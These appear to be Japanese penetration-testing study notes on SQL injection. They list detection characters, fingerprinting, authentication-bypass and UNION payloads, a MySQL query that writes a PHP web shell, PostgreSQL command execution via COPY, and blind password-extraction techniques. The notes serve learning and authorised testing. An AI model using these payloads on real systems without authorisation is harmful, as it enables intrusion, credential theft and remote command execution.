- 関連ノート：
	- [[1433 - MSSQL]]
	- [[0. RDBMSの基本]]

- 参考：
	- [SQLi cheat sheet - PortsSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet) : RDBMSごとの文法で記載あり
	- [SQL Injection Cheatsheet - tib3rius](https://tib3rius.com/sqli.html)

---

# In-band SQLi

結果がブラウザの画面やレスポンス内に直接表示されるタイプのSQLiのこと（攻撃の送信とデータの取得を同じ通信チャネルで実施）。

直接結果が現れないタイプを、[[#Blind SQLi]]という。

## 🔍Enumeration

### 悪意のある文字を使ったテスト（"Bad Chars"）

SQLi脆弱性がありそうな箇所：
- URLのクエリパラメタ
- HTMLフォームのパラメタ(ログインフォームなど)
- 検索box
- Cookie

SQL/NoSQLインジェクションの検出に使えるキャラクタ
```
'
"
\
;
`
)
}
--
#
/*
//
$
%
%%
```

> [!TIP] 
> - 検索boxでは、行頭に`%`をつける(e.g.`%' xxx -- //`)
> - `--` の後の空白がアプリ側で除去される場合があるので、コメントを使って対応する
> 	- `-- #`
> 	- `-- //` ...など（[[#SQLコメントアウトの種類表]]）
> - HTTPリクエストヘッダが`Content-Type: application/x-www-form-urlencoded`のときは、ペイロードをURLエンコードすること
> - 明確なエラーメッセージが表示されない場合もあるため、レスポンスの応答時間やlengthの変化を観察

### RDBMSのフィンガープリンティング

エラーメッセージの種類表

| RDBMS      | 典型エラーメッセージ                                                                        | 備考                                                                       |
| ---------- | --------------------------------------------------------------------------------- | ------------------------------------------------------------------------ |
| MSSQL      | `Unclosed quotation mark after the character string`  <br>`Incorrect syntax near` | `SqlException` や `.SqlClient.` を含む<br>（参考ノート：[[Webアプリケーションのテクノロジー#ASP]]） |
| MySQL      | `You have an error in your SQL syntax; check the manual...`                       | `MySqlException` など                                                      |
| PostgreSQL | `syntax error at or near`                                                         | `org.postgresql.util.PSQLException`（Java系）                               |
| Oracle     | `ORA-01756: quoted string not properly terminated`                                | `OracleException` が出ることもある                                               |

バージョン情報表示のコマンド表

| RDBMS      | コマンド                                                                 |
| ---------- | -------------------------------------------------------------------- |
| Oracle     | ・`SELECT banner FROM v$version`<br>・`SELECT version FROM v$instance` |
| Microsoft  | `SELECT @@version`                                                   |
| PostgreSQL | `SELECT version()`                                                   |
| MySQL      | ・`SELECT @@version`<br>・`SELECT version()`                           |

### SQLコメントアウトの種類表

| コメント    | 対応DB       | 備考           |
| ------- | ---------- | ------------ |
| `--`    | 多くのDB      | 空白が必要        |
| `/* */` | 多くのDB      | 複数行コメント      |
| `#`     | **MySQL**  | 単行コメント(空白不要) |
| `REM`   | **Oracle** | 単行コメント       |

### UNION SQLi に向けた準備

UNION SQLiとは、SQLの UNION 演算子を悪用して、本来のクエリ結果に「攻撃者が知りたい別のデータ」を合体させて奪い取る手法。

#### ステップ1: 必要な列の数を割り出す

UNION演算子は、連結元のクエリと同じカラム数を連結させる必要があるため。

##### 方法①：ORDER BY（優先度高）

1. 存在し得ないカラムを指定し、UNION SQLiが可能かどうかを確かめる
```sql
' ORDER BY hogefoo -- //
```
- →レスポンスの`Unknown column`を検索し、あればUNION SQLiが可能

2. エラーが発生するまでカラムインデックスをインクリメントする（エラーが発生する*直前*の値が実際のカラム数）
```sql
' ORDER BY 1-- //
' ORDER BY 2-- //
' ORDER BY 3-- //
	⋮
```

##### 方法②：UNION SELECT（優先度低）

```sql
' UNION SELECT NULL-- //
' UNION SELECT NULL,NULL-- //
' UNION SELECT NULL,NULL,NULL-- //
	⋮
```

> [!WARNING] 
> *NullPointerException*（NULL値が指定されたとき例外処理が稼働）：これがあると、NULL値の数が一致してもしなくても同じレスポンスが返ってくるのでこの方法は不可能

#### ステップ2：データ型が文字列型であるカラムを割り出す

抽出したいパスワードなどの情報は文字列型であるため。

1. すべてのカラムを同時にテストする
```sql
' UNION SELECT 'a1','a2','a3','a4' -- //
```

2. ステップ１で失敗したら、個々のカラムをテストしていく
```sql
' UNION SELECT 'a',NULL,NULL,NULL -- //
' UNION SELECT NULL,'a',NULL,NULL -- //
' UNION SELECT NULL,NULL,'a',NULL -- //
' UNION SELECT NULL,NULL,NULL,'a' -- //
```
- あるカラムが文字列型だとわかったら、値を残したまま検証する
```sql
' UNION SELECT NULL,'a','a',NULL-- 
' UNION SELECT NULL,'a',NULL,'a'-- 
```

💡Webアプリの検索boxにUNION SELECTを使う時は、クオテーションの前に`%`を使用することで、すべてのテーブルの値を表示できる可能性がある
```sql
%' UNION SELECT 'a1','a2','a3','a4' -- //
```

---

## 💥Exploit

### 認証バイパス

ユーザー名またはパスワード欄に以下を入力：
```sql
' or 1=1 -- #  <-- MySQL,MSSQL
' || '1'='1' -- #  <-- PostgreSQL
admin' or 1=1 -- #
admin') or (1=1 -- #
```

### UNION-based

#### スキーマ・カラム情報の取得

1. 現在のデータベースから、テーブル名・カラム名を出力
```mysql
' UNION SELECT NULL, table_name, column_name, table_schema, NULL FROM information_schema.columns WHERE table_schema=database() -- //
```

2. ターゲットのテーブルから情報を取得
```sql
' UNION SELECT username, password FROM users -- //
```

> [!TIP]
> 1つのカラムのみ利用可能な場合[SQLi cheet sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)の「String concatenation」を参照し、文字列を連結する

```sql
' UNION SELECT CONCAT(username, '~', password) FROM users -- //
```

#### ★Webシェルの書き込み（MySQL）

必要な条件：ファイルの保存先がMySQLを実行しているユーザによって書き込み可能なこと。

1. 書き込み可能なディレクトリに PHP web shellの文字列をファイルとして保存する
```mysql
' UNION SELECT "<?php system($_GET[\"cmd\"]);?>", null, null, null, null INTO OUTFILE "/var/www/html/webshell.php" -- //
```
- `\"cmd\"`: クオテーションが誤解されないように
- `/var/www/html`はApacheのデフォルトのWeb root、IISであれば`C:\inetpub\wwwroot`
	- phpinfoの確認ができるのであれば、`$_SERVER['DOCUMENT_ROOT']`にWeb rootディレクトリが記載されているので、そこに保存する
- `Uncaught type error`が返ることがあるが、返り値が意図されていたデータ型と異なるだけで、webshellの書き込みには影響はない
![[Pasted image 20250420091519.png]]
$$書き込み時のレスポンス例$$

2. アップロード先urlにアクセスして任意のコマンドを実行する
```
http://example.com/webshell.php?cmd=id
```

---
---

# Blind SQLi

## 🔍Enumeration

### Boolean-based

挿入した条件文のクエリがTrueかFalseかで、アプリのレスポンスの挙動に変化があるもの。

基本構文
```sql
' AND 1=1 -- //
' AND 1=2 -- //
```
- ※ANDの後、TrueかFalseが返るようにする

### Time-based

挿入した条件文のクエリがTrueかFalseかで、レスポンス時間の差が出るもの。

基本構文
```sql
' AND IF (1=1, sleep(3),'false') -- //
' AND IF (1=2, sleep(3), 'false') -- //
```
or
```zsh
' AND 1=1; SELECT SLEEP(5); --
```
or
```sh
' UNION SELECT SLEEP(5); --
```

### Error-based

 挿入した条件文のクエリがrueの場合に意図的にエラーを発生させ、エラーであれば
[[#悪意のある文字を使ったテスト（"Bad Chars"）]]でわかる可能性が高い。

基本構文(IF文)
```sql
' AND IF(1=2, 1/0, 'a') = 'a'--
' AND IF(1=1, 1/0, 'a') = 'a'--
```
- 💡PostgreSQLの場合はIF文は適さないのでCASEを優先する - pentest monekyより）
- 🔗参考：[Conditional errors - SQLi cheat sheet by PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet#:~:text=TABLE%2DNAME%2DHERE%27-,Conditional%20errors,-You%20can%20test)

---

## 💥Exploit

### リモートコマンドの実行

- MySQL：[[#★Webシェルの書き込み（MySQL）]]
- MSSQL：[[1433 - MSSQL#💥 Exploit]]

#### PostgreSQL

- 前提条件：
	- 実行するユーザーがDBのadminであること(実際のrootとは異なる)
	- PostgreSQL のバージョンが9.3以降であること
	- （参考記事🔗：[Command Execution with PostgreSQL Copy Command](https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767)）
```sql
CREATE TABLE shell(output text);
COPY shell FROM PROGRAM '<コマンド>';
```

### データの抽出

#### Boolean-based

##### データ抽出の基本構文

- 例として、DB名が"offsec"とする

LIKE句を使う
```sql
' AND database() LIKE 'o%' -- //  <-- succeeds
' AND database() LIKE 'p%' -- //  <-- fails
```

SUBSTR関数を使う
```sql
admin' AND SUBSTRING(database(),1,1)<'f' -- #
```
- 🚨：SUBSTR関数は、単一の値を引数に取るため、クエリの結果、複数レコードが返る場合は、`LIMIT 1`とする

##### Boolean-based SQLi 具体例：パスワード抽出

1. おおまかな文字列長の幅を決める
```sql
user=offsec' AND (SELECT username FROM users WHERE username = 'administrator' AND LENGTH(password) > 1) = 'administrator' -- //
```
```sql
user=offsec' AND (SELECT username FROM users WHERE username = 'administrator' AND LENGTH(password) > 50) = 'administrator' -- //
```

2. Intruderで正確な文字数を総当たりして割り出す
```sql
user=offsec' AND (SELECT username FROM users WHERE username = 'administrator' AND LENGTH(password) > §1§) = 'administrator'-- //
```
- Attack Type: sniper
- Payload Type: Numbers
![[Pasted image 20250420094746.png]]

3. Intruderの結果から、レスポンスが変わる境界値を探す
	- 実際にWebアプリ上で条件がTrueの反応があるかどうかを確認

4. SUBSTRING関数のクエリを作成
```sql
user=offsec' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),1, 1) = '0' -- //
```

5. Intruderで総当たり
```sql
user=offsec' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),§1§, 1) = '§0§' -- //
```
- `§1§`: `SUBSTRING`関数で抽出するスタート地点のインデックス(1からスタート)
- `'§0§'`: 抽出した文字の比較先の文字
- Attack Type : Cluster bomb
- Payload set: 1 (`§1§`)
	- Payload type: Numbers
	- From: 1 
	- To: ステップ２でわかった文字数
	- Step:1

- Payload set: 2(`'§0§'`)
	- Payload type: Brute forcer
	- Min length:1
	- Max length:1

6. IntruderのLength列を降順にソートし、レスポンスに条件が正の時のメッセージが記載されているペイロードを抽出していく>

![[Pasted image 20250420095001.png]]


#### Time-based

基本構文（MySQL)
```sql
SELECT IF(<条件文>=1,SLEEP(3),'false')
```

具体例：
	Usersテーブルの中に、Username が 'Administrator' で、かつ Passwordの1文字目が 'm' より大きい行が 1 件存在するか
```sql
' AND IF((SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password,1,1) > 'm') = 1, SLEEP(3), 0) -- //
```
 - `AND IF (<ここに上記の条件が入ってる> = 1, sleep(3), 'false' -- //)`

- 参考
	- RDBごとの文法：[SQL cheet sheet Time delays & Conditional Time delays](https://portswigger.net/web-security/sql-injection/cheat-sheet#:~:text=a%20MySQL%20database.-,Time%20delays,-You%20can%20cause)
	- Burp SuiteのRepeaterの右下にレスポンスタイムが記載
![[Pasted image 20250420100807.png]]

#### Error-based

##### 基本構文

IN句
```sql
' OR 1=1 IN (<bool以外の値が返ってくるクエリ>) -- //
```
具体例
```sql
' OR 1=1 IN (SELECT @@version) -- //
' OR 1=1 IN (SELECT password FROM users WHERE username = 'admin') -- //
```

任意の条件がTrueのときErrorが返るようにする
```sql
SELECT IF(<条件文>,　1/0, 'a') = 'a'
```
-  条件文Falseのときは文字列`a`が返り、エラーなし

`EXTRACTVALUE()` の活用（MySQL専用）
```sql
-- 基本
SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT [secret])))

-- 具体
SELECT EXTRACTVALUE(1, CONCAT(0x5c, (SELECT password FROM users LIMIT 1)));
```
- → `XPATH syntax error: '\secret'` のように表示されて漏れる。
- ⚠️`EXTRACTVALUE()` は XML 関連関数で、MySQL 5.1～8.0で動作（8.0.27 以降廃止）

##### Error-based SQLi 具体例：パスワードの抽出

- 基本の考え方は[[#Boolean-based SQLi 具体例：パスワード抽出]]と同じだが、Error-basedはWebアプリのレスポンスから値が漏洩する

1. 文字のおおまかな範囲を決定する。
```sql
user=offsec' AND IF((SELECT LENGTH(password) FROM users WHERE username = 'administrator') > 1, 1/0, 'a') = 'a' -- //
```

2. 文字を特定する
```sql
user=offsec' AND IF((SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='administrator') = 'm', 1/0, 'a') = 'a'--
```
- 💡自動で実行する方法は、[[#Boolean-based SQLi 具体例：パスワード抽出]]のペイロードを、Error-basedに変更するだけ
- 参考：[Extracting data via visible error messages - SQLi cheat sheet by PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet#:~:text=Extracting%20data%20via%20visible%20error%20messages)


